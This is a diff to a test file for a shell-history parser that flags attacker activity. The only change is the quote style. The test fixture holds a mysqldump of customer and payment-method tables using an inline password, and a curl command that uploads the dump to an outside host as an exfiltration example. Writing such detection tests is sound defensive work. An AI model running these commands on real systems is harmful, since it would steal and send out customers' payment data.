@@ -89,7 +89,7 @@ describe("parseShellHistoryFile — classification + IOCs", () => {
   it("flags a DB dump as Medium collection and a curl file-upload as Medium exfil — #199", () => {
     const ops = [
       "mysqldump -u veridia_app -pveridia-db-p455 veridia_prod customers payment_methods > /tmp/export-4291.sql",
-      "curl -X POST https://northlakeportal.com/api/sync -F \"data=@/tmp/export-4291.sql.gz\" --silent",
+      'curl -X POST https://northlakeportal.com/api/sync -F "data=@/tmp/export-4291.sql.gz" --silent',
     ].join("\n");
     const r = parseShellHistoryFile(ops, { user: "deploy" });
     const dump = r.events.find((e) => /mysqldump/.test(e.description));
